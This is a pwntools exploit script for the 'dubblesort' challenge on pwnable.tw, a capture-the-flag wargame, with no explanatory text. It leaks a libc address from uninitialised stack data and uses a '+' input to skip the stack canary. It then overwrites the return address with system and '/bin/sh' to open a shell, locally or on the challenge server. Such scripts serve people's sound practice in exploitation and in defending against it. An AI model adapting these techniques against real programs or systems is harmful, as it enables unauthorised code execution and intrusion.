#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./dubblesort"
elf=ELF(pwn_file)
libc=ELF("./libc_32.so.6")

if len(sys.argv)==1:
    r=process(pwn_file, env={"LD_PRELOAD":"./libc_32.so.6"})
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10101)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def write(data):
    r.sendlineafter("number : ", data)

debug()

r.recv()
r.send('a'*0x1c)
r.recvuntil('a'*0x1c)
a = u32(r.recv(4))-0x1ae244
libc.address = a
system = libc.sym['system']
binsh = libc.search("/bin/sh").next()
success("libc:      " + hex(a))
success("system:    " + hex(system))
success("binsh:     " + hex(binsh))

r.recv()
r.sendline(str(35))

for i in range(24):
    write(str(1))
write("+")
for i in range(7):
    write(str(0xf7000000))
write(str(system))
write(str(system+1))
write(str(binsh))

r.interactive()
